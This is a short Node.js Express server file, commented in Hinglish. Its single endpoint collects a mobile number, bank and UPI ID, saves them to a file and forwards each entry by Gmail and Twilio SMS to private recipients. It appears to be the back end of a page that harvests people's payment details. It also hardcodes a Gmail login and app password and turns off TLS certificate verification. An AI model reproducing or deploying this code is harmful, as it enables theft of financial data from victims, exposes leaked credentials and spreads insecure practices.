require('dotenv').config(); // Load .env file

const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const nodemailer = require('nodemailer');
const twilio = require('twilio');
const cors = require('cors'); // Add CORS

const app = express(); // Initialize the app here
app.use(cors()); // Enable CORS
app.use(bodyParser.json());

// API to handle form data
app.post('/saveData', (req, res) => {
    const { mobile, bank, upi } = req.body;

    // Data file mein save karna
    const data = `Mobile: ${mobile}, Bank: ${bank}, UPI: ${upi}\n`;
    fs.appendFileSync('user_data.txt', data);

    // Email bhejna
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
          user: 'videocall312@gmail.com',
          pass: 'iahz ygiz pmdj ymlc',  // or your Gmail password if using less secure apps
        },
        tls: {
          rejectUnauthorized: false,  // Skip SSL certificate verification
        },
      });
      

    const mailOptions = {
        from: process.env.GMAIL_USER,
        to: 'vinaykumarchaudhary370@gmail.com',
        subject: 'New User Data',
        text: data,
    };

    transporter.sendMail(mailOptions)
        .then(info => {
            console.log('Email sent:', info.response);

            // SMS bhejna (Twilio ke saath)
            const client = twilio(process.env.TWILIO_SID, process.env.TWILIO_AUTH_TOKEN);

            return client.messages.create({
                body: `New Data: Mobile=${mobile}, Bank=${bank}, UPI=${upi}`,
                from: process.env.TWILIO_PHONE, // Twilio ka phone number
                to: process.env.RECEIVER_PHONE, // Receiver ka phone number
            });
        })
        .then(message => {
            console.log('SMS sent:', message.sid);
            res.status(200).send('Data saved, email and SMS sent.');
        })
        .catch(error => {
            console.error('Error sending email or SMS:', error);
            res.status(500).send('Failed to send email or SMS.');
        });
});

app.listen(5000, () => console.log('Server running on port 5000'));

